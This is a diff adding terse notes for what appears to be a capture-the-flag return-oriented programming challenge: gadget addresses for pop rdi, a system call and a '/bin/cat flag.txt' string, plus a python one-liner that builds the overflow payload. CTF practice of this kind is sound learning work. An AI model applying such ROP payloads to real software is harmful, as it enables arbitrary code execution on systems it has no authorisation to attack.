@@ -1,0 +1,9 @@
+0x00601060 /bin/cat flag.txt
+
+
+2. Call /bin/ls			0x00400746
+1. pop rdi			0x004007c3
+3. Call /bin/cat flag.txt	0x00601060
+
+
+python -c 'print("AZ"*20 +"\xc3\x07\x40\x00\x00\x00\x00\x00" +"\x46\x07\x40\x00\x00\x00\x00\x00"+ "\x60\x10\x60\x00\x00\x00\x00\x00")'
